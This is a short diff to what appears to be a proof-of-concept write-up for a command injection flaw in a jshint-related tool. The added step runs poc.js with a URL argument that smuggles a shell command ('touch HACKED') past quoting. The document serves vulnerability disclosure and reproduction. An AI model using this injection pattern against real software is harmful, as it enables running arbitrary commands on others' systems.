@@ -13,3 +13,7 @@ var jshint = require("jshint/bin/apply");
 ```
 2. Check there aren't files called `HACKED` 
 3. Execute the following commands in another terminal:
+
+```bash
+node poc.js 'https://eee.w.www.ww"; touch HACKED; #' #  Run the PoC ... you'll need to CTRL+C after some seconds
+```
